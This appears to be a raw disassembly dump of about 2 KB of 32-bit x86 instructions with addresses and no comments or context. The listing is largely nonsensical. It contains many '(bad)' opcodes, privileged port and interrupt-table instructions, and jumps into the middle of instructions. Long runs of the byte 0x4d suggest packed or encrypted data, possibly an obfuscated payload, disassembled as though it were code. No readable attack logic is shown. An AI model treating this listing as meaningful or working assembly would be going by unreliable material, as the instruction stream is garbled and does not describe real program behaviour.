  4265d4:	clc    
  4265d5:	sub    esp,ebp
  4265d7:	mov    dl,0xed
  4265d9:	mov    ebp,DWORD PTR [edi-0x29]
  4265dc:	icebp  
  4265dd:	xor    BYTE PTR [edi-0x79],0x80
  4265e1:	lock xor cl,BYTE PTR [ecx]
  4265e4:	inc    esi
  4265e5:	std    
  4265e6:	or     al,0xb2
  4265e8:	mov    esi,0x87f0800c
  4265ed:	adc    BYTE PTR [edi+0x537c5332],0x72
  4265f4:	mov    dl,0xba
  4265f6:	sub    edi,edi
  4265f8:	sti    
  4265f9:	les    edx,FWORD PTR [edx-0x32882aff]
  4265ff:	mov    ecx,0x5c09a180
  426604:	sbb    DWORD PTR [ecx],ecx
  426606:	pop    esp
  426607:	jo     0x42665c
  426609:	adc    DWORD PTR [edx-0x72c7163e],esp
  42660f:	lea    esi,[esi+0x9bab207]
  426615:	(bad)  
  426616:	(bad)  
  426617:	adc    BYTE PTR [ecx+0x2f],al
  42661a:	inc    ecx
  42661b:	or     eax,0xf0804d4d
  426620:	stc    
  426621:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  426628:	mov    dl,0x7
  42662a:	or     al,0x80
  42662c:	xchg   edi,eax
  42662d:	stc    
  42662e:	adc    bh,0x86
  426631:	push   ebx
  426632:	sub    dl,BYTE PTR [ebx+0xb]
  426635:	call   DWORD PTR [ecx-0x4e]
  426638:	clc    
  426639:	sub    esp,ebp
  42663b:	mov    dl,0xed
  42663d:	mov    ecx,DWORD PTR [edi+edx*8-0x78887f0f]
  426644:	xor    al,0x32
  426647:	or     DWORD PTR [esi-0x3],eax
  42664a:	or     al,0xb2
  42664c:	mov    esi,0x87f0800c
  426651:	adc    BYTE PTR [edi+0x537c5332],0x72
  426658:	mov    dl,0xba
  42665a:	sub    edi,edi
  42665c:	sti    
  42665d:	les    esi,FWORD PTR [ebp+0x1]
  426660:	push   esi
  426661:	ja     0x4266d0
  426663:	dec    ebp
  426664:	dec    ebp
  426665:	dec    ebp
  426666:	mov    ecx,0x5c09a180
  42666b:	sbb    DWORD PTR [ecx],ecx
  42666d:	pop    esp
  42666e:	jo     0x4266c3
  426670:	adc    DWORD PTR [edx-0x72c7163e],esp
  426676:	lea    esi,[esi+0x9bab207]
  42667c:	(bad)  
  42667d:	(bad)  
  42667e:	adc    BYTE PTR [ecx+0x2f],al
  426681:	prefetchw BYTE PTR [ebp+0x4d]
  426685:	xor    al,0xf9
  426688:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  42668f:	mov    dl,0x7
  426691:	or     al,0x80
  426693:	xchg   edi,eax
  426694:	stc    
  426695:	adc    bh,0x86
  426698:	push   ebx
  426699:	sub    dl,BYTE PTR [ebx+0xb]
  42669c:	call   DWORD PTR [ecx-0x4e]
  42669f:	clc    
  4266a0:	sub    esp,ebp
  4266a2:	mov    dl,0xed
  4266a4:	mov    ebp,edi
  4266a6:	xlat   BYTE PTR ds:[ebx]
  4266a7:	pop    esp
  4266a8:	add    DWORD PTR [edi-0x7],ecx
  4266ab:	or     eax,0x77504d4d
  4266b0:	mov    eax,DWORD PTR [eax+0x49608b77]
  4266b6:	cmp    eax,0xef50d146
  4266bb:	icebp  
  4266bc:	outs   dx,BYTE PTR ds:[esi]
  4266bd:	sub    ecx,DWORD PTR [ebx]
  4266bf:	sub    BYTE PTR [eax+0xa],dl
  4266c2:	out    dx,al
  4266c3:	or     BYTE PTR [edi-0x7],0xd
  4266c7:	dec    ebp
  4266c8:	dec    ebp
  4266c9:	sbb    BYTE PTR [eax-0x7a],0xd
  4266cd:	dec    ebp
  4266ce:	dec    ebp
  4266cf:	push   eax
  4266d0:	xlat   BYTE PTR ds:[ebx]
  4266d1:	xchg   dl,bh
  4266d3:	and    ah,BYTE PTR [edi+ebp*2]
  4266d6:	cmp    BYTE PTR [ebx-0x4e],ah
  4266d9:	or     DWORD PTR [edi-0x2a],ecx
  4266dc:	cmp    cl,BYTE PTR [ebp-0x7968a073]
  4266e2:	or     DWORD PTR [edi+0x6e],ecx
  4266e5:	cmp    cl,BYTE PTR [ebp+0x38305e8d]
  4266eb:	lea    ecx,[ebp-0x74b0af47]
  4266f1:	or     eax,0x74804d4d
  4266f6:	mov    ecx,0xd854f50
  4266fb:	dec    ebp
  4266fc:	dec    ebp
  4266fd:	pop    esi
  4266fe:	daa    
  4266ff:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426705:	mov    cl,BYTE PTR ds:0x2c5e4d4d
  42670b:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426711:	or     eax,0x5e4d4d0d
  426716:	pop    ds
  426717:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  42671d:	lea    ecx,[ebp+0x4d]
  426720:	dec    ebp
  426721:	in     eax,dx
  426722:	push   0xffffffe8
  426724:	cmp    ch,0xb9
  426727:	push   eax
  426728:	add    DWORD PTR [ecx*2+0x77804d4d],ecx
  42672f:	jno    0x426791
  426731:	jae    0x42676b
  426733:	lea    ecx,[ebp-0x11feaf47]
  426739:	dec    ebp
  42673a:	dec    ebp
  42673b:	dec    ebp
  42673c:	in     eax,dx
  42673d:	mov    dl,0xaa
  42673f:	mov    ecx,0x4d6f0150
  426744:	dec    ebp
  426745:	dec    ebp
  426746:	pusha  
  426747:	push   edi
  426748:	cmp    BYTE PTR [ebp+0x150b98d],cl
  42674e:	out    dx,eax
  42674f:	dec    ebp
  426750:	dec    ebp
  426751:	dec    ebp
  426752:	in     eax,dx
  426753:	mov    dl,0x9d
  426755:	mov    ecx,0x4da60150
  42675a:	dec    ebp
  42675b:	dec    ebp
  42675c:	adc    BYTE PTR [ecx],0xb9
  42675f:	push   eax
  426760:	add    DWORD PTR [ecx],esp
  426762:	dec    ebp
  426763:	dec    ebp
  426764:	dec    ebp
  426765:	pusha  
  426766:	in     eax,dx
  426767:	cmp    BYTE PTR [ebp+0x150b98d],cl
  42676d:	mov    eax,ds:0x534d4d4d
  426772:	cld    
  426773:	pusha  
  426774:	xor    ch,BYTE PTR [esi-0x73]
  426777:	lea    edi,[ecx+0x4d710150]
  42677d:	dec    ebp
  42677e:	dec    ebp
  42677f:	mov    dl,0x86
  426781:	or     al,0x60
  426783:	sbb    ebx,DWORD PTR [eax]
  426785:	lea    ecx,[ebp-0x6ffeaf47]
  42678b:	dec    ebp
  42678c:	dec    ebp
  42678d:	dec    ebp
  42678e:	pusha  
  42678f:	fwait
  426790:	xchg   BYTE PTR [ebp+0x150b98d],cl
  426796:	adc    eax,0x804d4d4d
  42679b:	lock jno 0x42678b
  42679e:	add    eax,0x29bab20d
  4267a3:	push   DWORD PTR [edx+0xd164f50]
  4267a9:	dec    ebp
  4267aa:	dec    ebp
  4267ab:	xor    BYTE PTR [edi+0x21],0x80
  4267af:	lock and DWORD PTR [ebx-0x4],edx
  4267b3:	mov    dl,0x86
  4267b5:	or     al,0xed
  4267b7:	add    eax,0x29bab20d
  4267bc:	push   DWORD PTR [edx+0x1e4f0f7c]
  4267c2:	or     eax,0x4d4d4d4d
  4267c7:	lea    ecx,[ebp+0xd164f01]
  4267cd:	dec    ebp
  4267ce:	dec    ebp
  4267cf:	or     al,BYTE PTR [eax-0xf7f8e89]
  4267d5:	jno    0x42682a
  4267d7:	cld    
  4267d8:	mov    dl,0x86
  4267da:	or     al,0xed
  4267dc:	add    eax,0x29bab20d
  4267e1:	push   DWORD PTR [edx-0x74b0fef6]
  4267e7:	or     eax,0x800a4d4d
  4267ec:	ja     0x4267b6
  4267ee:	or     ch,0x3e
  4267f1:	cmp    cl,BYTE PTR [ebp+0x194f7c8d]
  4267f7:	dec    ebp
  4267f8:	dec    ebp
  4267f9:	dec    ebp
  4267fa:	sar    ch,cl
  4267fc:	sbb    al,0x38
  4267fe:	dec    ebp
  4267ff:	add    DWORD PTR [eax-0x8b2ea89],0x808b7750
  426809:	ja     0x426796
  42680b:	dec    edi
  42680c:	push   0xffffffd5
  42680e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42680f:	mov    ds:0x1d4c6957,al
  426814:	in     eax,dx
  426815:	fstp   st(0)
  426817:	mov    esp,0x21f08076
  42681c:	adc    BYTE PTR [edi+0x530de221],0x51
  426823:	popf   
  426824:	push   ebx
  426825:	div    DWORD PTR [edx-0x414dd608]
  42682b:	or     al,0xff
  42682d:	inc    BYTE PTR [eax-0x2e7f3769]
  426833:	cmp    cl,BYTE PTR es:[ebp+0x9a65f8d]
  42683a:	dec    edi
  42683b:	push   0x808d8d2f
  426840:	lock and DWORD PTR [eax+0x51532197],eax
  426847:	mov    dl,0xbe
  426849:	or     al,0x53
  42684b:	div    DWORD PTR [edx-0x100d608]
  426851:	adc    BYTE PTR [edi-0x1a2e7f38],0x3a
  426858:	lea    ecx,[ebp-0xf7f59b0]
  42685e:	and    DWORD PTR [eax+0x51532197],eax
  426864:	mov    dl,0xbe
  426866:	or     al,0x53
  426868:	div    DWORD PTR [edx-0x100d608]
  42686e:	adc    BYTE PTR [edi-0x322e7f38],0x3a
  426875:	lea    ecx,[ebp+0x6760a650]
  42687b:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426881:	and    eax,0x804d4d4d
  426886:	adc    DWORD PTR [ecx+0x4d290150],edi
  42688c:	dec    ebp
  42688d:	dec    ebp
  42688e:	pusha  
  42688f:	daa    
  426890:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426896:	sub    eax,0x604d4d4d
  42689b:	sub    BYTE PTR [eax],bh
  42689d:	lea    ecx,[ebp-0x3ffeaf47]
  4268a3:	dec    ebp
  4268a4:	dec    ebp
  4268a5:	dec    ebp
  4268a6:	in     eax,dx
  4268a7:	mov    dl,0x4
  4268a9:	mov    ecx,0x4d350150
  4268ae:	dec    ebp
  4268af:	dec    ebp
  4268b0:	pusha  
  4268b1:	adc    al,0x38
  4268b3:	lea    ecx,[ebp+0x390150b9]
  4268b9:	dec    ebp
  4268ba:	dec    ebp
  4268bb:	dec    ebp
  4268bc:	in     eax,dx
  4268bd:	mov    dl,0xf3
  4268bf:	mov    ecx,0x4d3d0150
  4268c4:	dec    ebp
  4268c5:	dec    ebp
  4268c6:	pusha  
  4268c7:	sbb    al,0x38
  4268c9:	lea    ecx,[ebp-0x2dfeaf47]
  4268cf:	dec    ebp
  4268d0:	dec    ebp
  4268d1:	dec    ebp
  4268d2:	adc    BYTE PTR [ecx],0xb9
  4268d5:	push   eax
  4268d6:	add    DWORD PTR [ebp+0x4d],eax
  4268d9:	dec    ebp
  4268da:	dec    ebp
  4268db:	pusha  
  4268dc:	sbb    BYTE PTR [eax],bh
  4268de:	lea    ecx,[ebp+0x490150b9]
  4268e4:	dec    ebp
  4268e5:	dec    ebp
  4268e6:	dec    ebp
  4268e7:	pusha  
  4268e8:	daa    
  4268e9:	pop    ebp
  4268ea:	lea    ecx,[ebp-0x7efeaf47]
  4268f0:	dec    ebp
  4268f1:	dec    ebp
  4268f2:	dec    ebp
  4268f3:	pusha  
  4268f4:	push   ebx
  4268f5:	xor    ecx,DWORD PTR [ebp+0x150b98d]
  4268fb:	aam    0x4d
  4268fd:	dec    ebp
  4268fe:	dec    ebp
  4268ff:	cld    
  426900:	ja     0x426885
  426902:	mov    ds:0x8d185d60,eax
  426907:	lea    edi,[ecx+0x4d550150]
  42690d:	dec    ebp
  42690e:	dec    ebp
  42690f:	in     eax,dx
  426910:	mov    dl,0x5d
  426912:	mov    ecx,0x4d590150
  426917:	dec    ebp
  426918:	dec    ebp
  426919:	cld    
  42691a:	ja     0x4268c4
  42691c:	or     bh,ah
  42691e:	ja     0x426924
  426920:	xchg   ebp,eax
  426921:	cld    
  426922:	ja     0x4268d0
  426924:	stos   DWORD PTR es:[edi],eax
  426925:	pusha  
  426926:	(bad)  
  426928:	lea    ecx,[ebp+0x5d0150b9]
  42692e:	dec    ebp
  42692f:	dec    ebp
  426930:	dec    ebp
  426931:	cld    
  426932:	ja     0x4268b8
  426934:	jg     0x426996
  426936:	fistp  DWORD PTR [eax-0x73]
  426939:	lea    edi,[ecx+0x4dd60150]
  42693f:	dec    ebp
  426940:	dec    ebp
  426941:	cld    
  426942:	ja     0x4268fe
  426944:	popf   
  426945:	cld    
  426946:	ja     0x426940
  426948:	xchg   esi,eax
  426949:	pusha  
  42694a:	inc    edx
  42694b:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426951:	gs dec ebp
  426953:	dec    ebp
  426954:	dec    ebp
  426955:	cld    
  426956:	ja     0x42690c
  426958:	xchg   BYTE PTR [eax-0x687f8e10],al
  42695e:	jno    0x4269b3
  426960:	push   ecx
  426961:	push   ebx
  426962:	div    DWORD PTR [edx-0x74df342]
  426968:	sub    edi,edi
  42696a:	inc    ah
  42696c:	fwait
  42696d:	adc    BYTE PTR [edi+0x71e78071],0x53
  426974:	jle    0x426928
  426976:	pop    es
  426977:	or     al,0x53
  426979:	mov    esi,DWORD PTR [edx-0x6300d644]
  42697f:	inc    ebx
  426980:	dec    BYTE PTR [ecx]
  426982:	loopne 0x4269b5
  426984:	iret   
  426985:	add    DWORD PTR [eax-0x187f8e69],0x71
  42698c:	push   ebx
  42698d:	jle    0x426941
  42698f:	pop    es
  426990:	or     al,0x53
  426992:	mov    esi,DWORD PTR [edx-0x6300d644]
  426998:	and    bh,0x8b
  42699b:	mov    ds:0x8d8dcd05,al
  4269a0:	lea    esp,[edx-0x7272e14e]
  4269a6:	lea    eax,[ebx-0x7b]
  4269a9:	adc    BYTE PTR [ecx],dh
  4269ab:	add    DWORD PTR [bx+si+0x7197],0xffffff80
  4269b1:	lock jno 0x426a07
  4269b4:	jle    0x426a09
  4269b6:	std    
  4269b7:	mov    dl,0xba
  4269b9:	sub    DWORD PTR [edx-0x4900f3f9],esi
  4269bf:	xor    al,0x8b
  4269c2:	in     al,dx
  4269c3:	inc    BYTE PTR [eax-0x187f8e69]
  4269c9:	jno    0x426a1e
  4269cb:	jle    0x426a20
  4269cd:	mov    esi,DWORD PTR [edx-0x434df3f9]
  4269d3:	sub    edi,edi
  4269d5:	pushf  
  4269d6:	in     eax,dx
  4269d7:	sti    
  4269d8:	out    dx,eax
  4269d9:	push   eax
  4269da:	lock mov esp,DWORD PTR [ebx-0x2]
  4269de:	in     al,0x1
  4269e0:	xor    al,0x71
  4269e3:	adc    BYTE PTR [edi+0x53515371],0xf7
  4269ea:	mov    dl,0xbe
  4269ec:	or     al,0xb2
  4269ee:	clc    
  4269ef:	sub    edi,edi
  4269f1:	(bad)  
  4269f2:	push   eax
  4269f3:	add    DWORD PTR [esi],edx
  4269f5:	or     eax,0xf0804d4d
  4269fa:	and    DWORD PTR [eax+0x51532197],eax
  426a00:	push   ebx
  426a01:	div    DWORD PTR [edx-0x414dd608]
  426a07:	or     al,0xff
  426a09:	inc    BYTE PTR [ecx]
  426a0b:	xchg   edi,eax
  426a0c:	adc    DWORD PTR [eax+0x16],0x1
  426a10:	push   ds
  426a11:	or     eax,0xb3f14d4d
  426a16:	cmp    BYTE PTR [ebp-0x46017f73],cl
  426a1c:	push   eax
  426a1d:	lock es in eax,dx
  426a20:	mov    dl,0xfb
  426a22:	or     bl,0xb9
  426a25:	push   eax
  426a26:	out    0xf2,eax
  426a28:	add    esi,esp
  426a2a:	add    al,0xb9
  426a2c:	push   eax
  426a2d:	out    0x2e,eax
  426a2f:	in     eax,dx
  426a30:	jl     0x426a20
  426a32:	mov    ecx,0x1f3e750
  426a37:	out    0x15,al
  426a39:	mov    ecx,0xed36e750
  426a3e:	jl     0x426a43
  426a40:	mov    ecx,0x80f4e750
  426a45:	retf   
  426a46:	mov    ecx,0x803ee750
  426a4b:	test   DWORD PTR [ecx-0x7f0a18b0],edi
  426a51:	push   es
  426a52:	mov    ecx,0x8046e750
  426a57:	test   DWORD PTR [ecx-0x7f9d18b0],edi
  426a5d:	retf   
  426a5e:	mov    ecx,0x1dee750
  426a63:	out    0xf2,al
  426a65:	mov    ecx,0xed56e750
  426a6a:	jl     0x426a5a
  426a6c:	mov    ecx,0x1e0e750
  426a71:	out    0x7a,al
  426a73:	mov    ecx,0xed5ee750
  426a78:	jl     0x426a7d
  426a7a:	mov    ecx,0xb9f1e750
  426a7f:	push   eax
  426a80:	lock mov cx,0x9750
  426a85:	cli    
  426a86:	adc    BYTE PTR [ecx],0xb9
  426a89:	push   eax
  426a8a:	lock push 0xffffff80
  426a8d:	lock and DWORD PTR [eax-0x8acde69],eax
  426a94:	push   ebx
  426a95:	push   ecx
  426a96:	mov    dl,0xf8
  426a98:	sub    DWORD PTR [edx-0x100f342],esi
  426a9e:	adc    BYTE PTR [edi+0x21e78021],0x53
  426aa5:	jle    0x426a59
  426aa7:	pop    es
  426aa8:	or     al,0x1
  426aaa:	xor    eax,esi
  426aac:	bound  edx,QWORD PTR [ebx-0x75]
  426aaf:	mov    dl,0xbc
  426ab1:	sub    edi,edi
  426ab3:	pushf  
  426ab4:	or     DWORD PTR [edi+ebx*2+0x53],ebx
  426ab8:	pushf  
  426ab9:	mov    ecx,0xf0800e50
  426abe:	and    DWORD PTR [eax+0x51532197],eax
  426ac4:	push   ebx
  426ac5:	div    DWORD PTR [edx-0x74df342]
  426acb:	sub    edi,edi
  426acd:	inc    BYTE PTR [eax+0x31012197]
  426ad3:	lock es push ebx
  426ad6:	jle    0x426a58
  426ad8:	out    0x21,eax
  426ada:	mov    dl,0x7
  426adc:	or     al,0x53
  426ade:	mov    esi,DWORD PTR [edx-0x6300d644]
  426ae4:	or     DWORD PTR [edi+ebx*2+0x53],ebx
  426ae8:	pushf  
  426ae9:	mov    ecx,0xf0800e50
  426aee:	and    DWORD PTR [eax-0x8acde69],eax
  426af4:	mov    dl,0xf8
  426af6:	sub    DWORD PTR [ebx+0x51],edx
  426af9:	mov    dl,0xbe
  426afb:	or     al,0xff
  426afd:	inc    BYTE PTR [eax-0x187fde69]
  426b03:	and    DWORD PTR [ebx+0x7e],edx
  426b06:	mov    dl,0x7
  426b08:	or     al,0x53
  426b0a:	mov    esi,DWORD PTR [edx-0x6300d644]
  426b10:	mov    ecx,0x52974150
  426b15:	or     eax,0xf0804d4d
  426b1a:	and    DWORD PTR [eax-0x8acde69],eax
  426b20:	mov    dl,0xf8
  426b22:	sub    DWORD PTR [ebx+0x51],edx
  426b25:	mov    dl,0xbe
  426b27:	or     al,0xff
  426b29:	inc    BYTE PTR [eax-0x187fde69]
  426b2f:	and    DWORD PTR [ebx+0x7e],edx
  426b32:	mov    dl,0x7
  426b34:	or     al,0x53
  426b36:	mov    esi,DWORD PTR [edx-0x6300d644]
  426b3c:	mov    ecx,0xa5974150
  426b41:	or     eax,0xf0804d4d
  426b46:	jno    0x426ac8
  426b48:	xchg   edi,eax
  426b49:	jno    0x426b9e
  426b4b:	not    DWORD PTR [ebx+0x51]
  426b4e:	mov    dl,0xf8
  426b50:	sub    DWORD PTR [edx-0x100f342],esi
  426b56:	adc    BYTE PTR [edi+0x71e78071],0x53
  426b5d:	jle    0x426bb2
  426b5f:	mov    esi,DWORD PTR [edx-0x434df3f9]
  426b65:	sub    edi,edi
  426b67:	pushf  
  426b68:	in     al,dx
  426b69:	(bad)  
  426b6a:	push   eax
  426b6b:	add    DWORD PTR [esi],edx
  426b6d:	or     eax,0xf0804d4d
  426b72:	and    DWORD PTR [eax-0x187fde69],eax
  426b78:	out    dx,eax
  426b79:	push   ebx
  426b7a:	not    DWORD PTR [ebx+0x51]
  426b7d:	mov    dl,0xbe
  426b7f:	or     al,0xb2
  426b81:	clc    
  426b82:	sub    edi,edi
  426b84:	inc    BYTE PTR [ecx]
  426b86:	dec    edi
  426b87:	push   edx
  426b88:	or     eax,0xf504d4d
  426b8d:	add    DWORD PTR [esi],ebx
  426b8f:	or     eax,0x77014d4d
  426b94:	bound  eax,QWORD PTR [esi+0x4d4d61d3]
  426b9a:	xor    al,0x71
  426b9d:	adc    BYTE PTR [edi+0x530de271],0x51
  426ba4:	stos   DWORD PTR es:[edi],eax
  426ba5:	push   ebx
  426ba6:	pushf  
  426ba7:	mov    dl,0xbe
  426ba9:	or     al,0xb2
  426bab:	clc    
  426bac:	sub    edi,edi
  426bae:	(bad)  
  426baf:	push   eax
  426bb0:	lidtd  [esi]
  426bb3:	or     eax,0x77804d4d
  426bb8:	and    DWORD PTR [eax-0x3acde10],eax
  426bbe:	mov    dl,0x86
  426bc0:	or     al,0x53
  426bc2:	sub    dh,BYTE PTR [edx-0x4d00d646]
  426bc8:	aad    0x3d
  426bca:	add    DWORD PTR [edi+0x16],ecx
  426bcd:	or     eax,0x800a4d4d
  426bd2:	ja     0x426c45
  426bd4:	xor    al,0x71
  426bd7:	push   ebx
  426bd8:	cld    
  426bd9:	mov    dl,0x86
  426bdb:	or     al,0x53
  426bdd:	sub    dh,BYTE PTR [edx-0x4d00d646]
  426be3:	or     al,BYTE PTR [ecx]
  426be5:	dec    edi
  426be6:	and    eax,0xa4d4d4d
  426beb:	xor    BYTE PTR [edi+0x15],0xe2
  426bef:	lea    ecx,[ebp-0x9]
  426bf2:	xor    BYTE PTR [edi+0x21],0x80
  426bf6:	lock and DWORD PTR [ebx-0x4],edx
  426bfa:	push   ebx
  426bfb:	sub    al,BYTE PTR [eax-0x794d1019]
  426c01:	or     al,0xb2
  426c03:	mov    edx,0x1b2ff29
  426c08:	add    DWORD PTR [ebp+0x504d4d0d],esp
  426c0e:	inc    ecx
  426c0f:	dec    edi
  426c10:	push   ds
  426c11:	or     eax,0x77014d4d
  426c16:	xchg   BYTE PTR es:0x804d4d88,al
  426c1d:	lock jno 0x426ba0
  426c20:	xchg   edi,eax
  426c21:	jno    0x426c76
  426c23:	push   ecx
  426c24:	mov    dl,0xbe
  426c26:	or     al,0xed
  426c28:	ret    0xb20d
  426c2b:	clc    
  426c2c:	sub    edi,edi
  426c2e:	(bad)  
  426c2f:	push   eax
  426c30:	lidtd  [esi]
  426c33:	or     eax,0x33f14d4d
  426c38:	cmp    BYTE PTR [ebp+0x386b5e8d],cl
  426c3e:	lea    ecx,[ebp+0xa4f50b9]
  426c44:	dec    ebp
  426c45:	dec    ebp
  426c46:	dec    ebp
  426c47:	add    edx,ebx
  426c49:	jno    0x426c04
  426c4b:	push   eax
  426c4c:	add    DWORD PTR [ebp+0x5e4d4d4d],esi
  426c52:	popa   
  426c53:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426c59:	stos   BYTE PTR es:[edi],al
  426c5a:	dec    ebp
  426c5b:	dec    ebp
  426c5c:	dec    ebp
  426c5d:	cmp    bl,0xb9
  426c60:	push   eax
  426c61:	dec    edi
  426c62:	xchg   ebp,eax
  426c63:	dec    ebp
  426c64:	dec    ebp
  426c65:	dec    ebp
  426c66:	xor    BYTE PTR [edx-0x66b0af47],0x4d
  426c6d:	dec    ebp
  426c6e:	dec    ebp
  426c6f:	in     eax,dx
  426c70:	push   0x29
  426c72:	cmp    ch,0xb9
  426c75:	push   eax
  426c76:	add    DWORD PTR [ecx+0x14d4d4d],edi
  426c7c:	fisubr DWORD PTR [ecx]
  426c7e:	mov    ecx,0x4dbd0150
  426c83:	dec    ebp
  426c84:	dec    ebp
  426c85:	in     eax,dx
  426c86:	mov    dl,0xd6
  426c88:	mov    ecx,0x4de20150
  426c8d:	dec    ebp
  426c8e:	dec    ebp
  426c8f:	add    edx,ebx
  426c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c92:	mov    ecx,0x4dc50150
  426c97:	dec    ebp
  426c98:	dec    ebp
  426c99:	or     BYTE PTR [ebx-0x6297af47],0x4d
  426ca0:	dec    ebp
  426ca1:	dec    ebp
  426ca2:	add    esi,esp
  426ca4:	scas   al,BYTE PTR es:[edi]
  426ca5:	pusha  
  426ca6:	dec    ebp
  426ca7:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426cad:	ror    DWORD PTR [ebp+0x4d],0x4d
  426cb1:	add    edx,ebx
  426cb3:	or     eax,0x520150b9
  426cb8:	dec    ebp
  426cb9:	dec    ebp
  426cba:	dec    ebp
  426cbb:	mov    ecx,0x4dae6850
  426cc0:	dec    ebp
  426cc1:	dec    ebp
  426cc2:	in     eax,dx
  426cc3:	jl     0x426c50
  426cc5:	mov    ecx,0x4da56850
  426cca:	dec    ebp
  426ccb:	dec    ebp
  426ccc:	or     BYTE PTR [ebx-0x72c783a0],0x8d
  426cd3:	mov    ecx,0x4de40150
  426cd8:	dec    ebp
  426cd9:	dec    ebp
  426cda:	cmp    ch,0xb9
  426cdd:	push   eax
  426cde:	add    ebp,edx
  426ce0:	dec    ebp
  426ce1:	dec    ebp
  426ce2:	dec    ebp
  426ce3:	xor    BYTE PTR [ecx+edi*4+0x50],0x4f
  426ce8:	out    0x4d,al
  426cea:	dec    ebp
  426ceb:	dec    ebp
  426cec:	push   ebx
  426ced:	push   0xffffffb9
  426cef:	push   eax
  426cf0:	push   0x4d4d4da9
  426cf5:	add    DWORD PTR [eax-0x1b],ebp
  426cf8:	dec    ebp
  426cf9:	dec    ebp
  426cfa:	dec    ebp
  426cfb:	jl     0x426d4c
  426cfd:	lods   eax,DWORD PTR ds:[esi]
  426cfe:	dec    ebp
  426cff:	dec    ebp
  426d00:	dec    ebp
  426d01:	out    0x38,eax
  426d03:	xor    edi,DWORD PTR [eax]
  426d05:	jl     0x426d56
  426d07:	(bad)  [ebp+0x4d]
  426d0a:	dec    ebp
  426d0b:	ret    
  426d0c:	cmp    BYTE PTR [esi-0x7fbb46c8],dl
  426d12:	ja     0x426d85
  426d14:	xor    al,0x71
  426d17:	adc    BYTE PTR [edi+0xd05ed71],0xb2
  426d1e:	mov    edx,0xb2fc5329
  426d23:	xchg   BYTE PTR [edi+edi*8],cl
  426d26:	mov    dl,0x80
  426d28:	lock jno 0x426d18
  426d2b:	add    eax,0xb27e530d
  426d30:	mov    edx,0xc07b229
  426d35:	push   DWORD PTR [esi-0x4128fad]
  426d3b:	sbb    edx,DWORD PTR [ebx]
  426d3d:	jo     0x426d92
  426d3f:	dec    ebp
  426d40:	arpl   bx,cx
  426d42:	or     esi,ecx
  426d44:	and    cl,BYTE PTR [ebp-0x101b7273]
  426d4a:	arpl   bx,di
  426d4c:	or     ebp,ebp
  426d4e:	cmp    BYTE PTR [ebp-0xf7f7273],cl
  426d54:	jno    0x426cd6
  426d56:	xchg   edi,eax
  426d57:	jno    0x426dac
  426d59:	push   ecx
  426d5a:	mov    dl,0xbe
  426d5c:	or     al,0xed
  426d5e:	ret    0xb20d
  426d61:	clc    
  426d62:	sub    edi,edi
  426d64:	(bad)  
  426d65:	in     al,dx
  426d66:	std    
  426d67:	adc    BYTE PTR [ecx+edi*4+0xaf01653],0x4d
  426d6f:	dec    ebp
  426d70:	dec    ebp
  426d71:	xor    al,0x71
  426d74:	and    bh,0x71
  426d77:	push   ebx
  426d78:	push   ecx
  426d79:	mov    dl,0xbe
  426d7b:	or     al,0xed
  426d7d:	dec    ebx
  426d7e:	or     eax,0xff29bcb2
  426d83:	sub    ch,ah
  426d85:	std    
  426d86:	mov    ecx,0xaf04180
  426d8b:	dec    ebp
  426d8c:	dec    ebp
  426d8d:	dec    ebp
  426d8e:	mov    ecx,0xb2b9b64b
  426d93:	mov    edx,0x7b6b909
  426d98:	mov    ecx,0xf080b6ff
  426d9d:	jno    0x426d1f
  426d9f:	out    0x71,eax
  426da1:	push   ebx
  426da2:	push   ecx
  426da3:	mov    dl,0xbe
  426da5:	or     al,0xed
  426da7:	dec    ebx
  426da8:	or     eax,0xff29bcb2
  426dad:	sub    ch,ah
  426daf:	std    
  426db0:	mov    ecx,0xaf01650
  426db5:	dec    ebp
  426db6:	dec    ebp
  426db7:	dec    ebp
  426db8:	xor    al,0x71
  426dbb:	adc    BYTE PTR [edi-0x12aeac8f],0xc2
  426dc2:	or     eax,0xb20cbeb2
  426dc7:	clc    
  426dc8:	sub    edi,edi
  426dca:	inc    BYTE PTR [eax-0x4d138e69]
  426dd0:	xor    al,0x71
  426dd3:	in     eax,dx
  426dd4:	add    eax,0xb27e530d
  426dd9:	mov    edx,0xc07b229
  426dde:	push   DWORD PTR [esi-0x4128fad]
  426de4:	sbb    edx,DWORD PTR [ebx]
  426de6:	jo     0x426e3b
  426de8:	dec    ebp
  426de9:	arpl   bx,cx
  426deb:	or     edx,ebp
  426ded:	call   0x934c:0x94d4d4d
  426df4:	dec    ebp
  426df5:	dec    ebp
  426df6:	dec    ebp
  426df7:	ins    BYTE PTR es:[edi],dx
  426df8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426df9:	mov    DWORD PTR [esp+edx*8],0x50767701
  426e00:	ja     0x426df1
  426e02:	xor    BYTE PTR [edi-0x11],0x64
  426e06:	mov    ecx,0x5011df58
  426e0b:	sbb    eax,0x86ee6d7c
  426e10:	pop    DWORD PTR [ebx+0x26]
  426e13:	xor    BYTE PTR [edi+0x76],0x80
  426e17:	lock std 
  426e19:	or     DWORD PTR [esi-0x3],eax
  426e1c:	or     al,0xb2
  426e1e:	mov    esi,0x76f0800c
  426e23:	adc    BYTE PTR [edi+0x537c53fd],0x72
  426e2a:	push   edi
  426e2c:	xor    BYTE PTR [edi-0x38],0xaa
  426e30:	das    
  426e31:	cmp    cl,BYTE PTR es:[ebp+0x4f010a8d]
  426e38:	enter  0x4d0d,0x4d
  426e3c:	or     dh,BYTE PTR [edx+0x778629ba]
  426e42:	mov    edx,0x77804d4d
  426e47:	xchg   DWORD PTR [eax+0x460932f0],eax
  426e4d:	std    
  426e4e:	or     al,0xb2
  426e50:	mov    esi,0x87f0800c
  426e55:	adc    BYTE PTR [edi+0x29bab232],0x80
  426e5c:	add    eax,ecx
  426e5e:	or     eax,0x30804d4d
  426e63:	push   ebx
  426e64:	jl     0x426eb9
  426e66:	jb     0x426e67
  426e68:	sti    
